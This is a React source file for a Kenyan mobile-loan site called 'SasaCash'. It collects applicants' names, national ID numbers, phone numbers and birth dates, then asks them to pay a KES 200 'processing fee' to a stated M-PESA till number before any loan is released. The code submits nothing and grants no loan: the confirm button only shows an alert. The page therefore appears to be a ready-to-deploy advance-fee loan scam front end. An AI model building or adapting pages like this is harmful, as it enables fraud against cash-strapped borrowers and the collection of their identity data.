"use client";
import { useState } from "react";

export default function Home() {
  const [showForm, setShowForm] = useState(false);
  const [step, setStep] = useState(1);

  const [form, setForm] = useState({
    firstName: "",
    middleName: "",
    lastName: "",
    id: "",
    phone: "",
    dob: "",
    maritalStatus: "",
    employmentStatus: "",
    amount: "",
    months: "",
    purpose: "",
  });

  const interestRate = 0.15;

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const loanAmount = Number(form.amount) || 0;
  const months = Number(form.months) || 0;
  const interest = loanAmount * interestRate;
  const total = loanAmount + interest;

  // 🟢 HOMEPAGE
  if (!showForm) {
    return (
      <div style={styles.container}>
        <img src="/logo.png" style={styles.logo} />

        <div style={styles.card}>
          <h2>Get up to KES 50,000</h2>
          <p>Quick loans with 15% fixed interest. Apply in minutes.</p>

          <button style={styles.applyBtn} onClick={() => setShowForm(true)}>
            Apply Now →
          </button>
        </div>

        <div>
          <h3>Why SasaCash?</h3>
          <div style={styles.feature}>⚡ Instant Processing</div>
          <div style={styles.feature}>🔒 Secure & Private</div>
          <div style={styles.feature}>✅ Simple 4-step process</div>
        </div>
      </div>
    );
  }

  // 🟢 FORM
  return (
    <div style={styles.container}>
      <h2>Loan Application</h2>

      {/* STEP 1 */}
      {step === 1 && (
        <>
          <input name="firstName" placeholder="First Name *" onChange={handleChange} style={styles.input} />
          <input name="middleName" placeholder="Middle Name (optional)" onChange={handleChange} style={styles.input} />
          <input name="lastName" placeholder="Last Name *" onChange={handleChange} style={styles.input} />
          <input name="id" placeholder="ID Number *" onChange={handleChange} style={styles.input} />
          <input name="phone" placeholder="Phone Number *" onChange={handleChange} style={styles.input} />
          <input type="date" name="dob" onChange={handleChange} style={styles.input} />

          <select name="maritalStatus" onChange={handleChange} style={styles.input}>
            <option value="">Marital Status *</option>
            <option>Single</option>
            <option>Married</option>
            <option>Divorced</option>
            <option>Widowed</option>
          </select>

          <select name="employmentStatus" onChange={handleChange} style={styles.input}>
            <option value="">Employment Status *</option>
            <option>Employed</option>
            <option>Self Employed</option>
            <option>Business</option>
            <option>Student</option>
            <option>Other</option>
          </select>

          <button style={styles.button} onClick={() => setStep(2)}>Next</button>
        </>
      )}

      {/* STEP 2 */}
      {step === 2 && (
        <>
          <input
            name="amount"
            type="number"
            placeholder="Loan Amount (KES 1,000 - 50,000) *"
            onChange={handleChange}
            style={styles.input}
          />

          <input
            name="months"
            type="number"
            placeholder="Repayment Period (1 - 12 months) *"
            onChange={handleChange}
            style={styles.input}
          />

          <select name="purpose" onChange={handleChange} style={styles.input}>
            <option value="">Loan Purpose *</option>
            <option>Business</option>
            <option>Personal</option>
            <option>Medical</option>
            <option>Emergency</option>
            <option>Other</option>
          </select>

          <button style={styles.button} onClick={() => setStep(1)}>Back</button>
          <button style={styles.button} onClick={() => setStep(3)}>Next</button>
        </>
      )}

      {/* STEP 3 */}
      {step === 3 && (
        <>
          <h3>Review</h3>
          <p>Name: {form.firstName} {form.lastName}</p>
          <p>Loan: KES {loanAmount}</p>
          <p>Interest (15%): KES {interest}</p>
          <p>Total: KES {total}</p>

          <button style={styles.button} onClick={() => setStep(2)}>Back</button>
          <button style={styles.button} onClick={() => setStep(4)}>Proceed</button>
        </>
      )}

      {/* STEP 4 */}
      {step === 4 && (
        <>
          <h3>Processing Fee Payment</h3>

          <p>Pay a processing fee of <strong>KES 200</strong> to receive your loan.</p>

          <p>1. Go to M-PESA menu</p>
          <p>2. Select Lipa Na M-PESA</p>
          <p>3. Select Buy Goods and Services</p>
          <p>4. Enter Till Number <strong>8808802</strong></p>
          <p>5. Enter amount KES 200</p>
          <p>6. Enter M-PESA PIN and press OK</p>

          <p style={{ color: "red", fontWeight: "bold" }}>
            NOTE: You will receive your loan if you have paid the processing fee.
          </p>

          <button style={styles.button} onClick={() => alert("Application submitted!")}>
            Confirm Payment
          </button>
        </>
      )}
    </div>
  );
}

const styles = {
  container: {
    maxWidth: "400px",
    margin: "auto",
    padding: "20px",
    fontFamily: "Arial",
  },
  logo: {
    width: "120px",
    marginBottom: "20px",
  },
  card: {
    background: "#1f7a4c",
    color: "white",
    padding: "20px",
    borderRadius: "20px",
    marginBottom: "20px",
  },
  applyBtn: {
    marginTop: "15px",
    padding: "12px",
    background: "white",
    border: "none",
    borderRadius: "10px",
    cursor: "pointer",
  },
  feature: {
    background: "#f1f1f1",
    padding: "12px",
    margin: "10px 0",
    borderRadius: "10px",
  },
  input: {
    width: "100%",
    padding: "10px",
    margin: "10px 0",
  },
  button: {
    padding: "10px",
    margin: "5px",
    background: "green",
    color: "white",
    border: "none",
  },
};
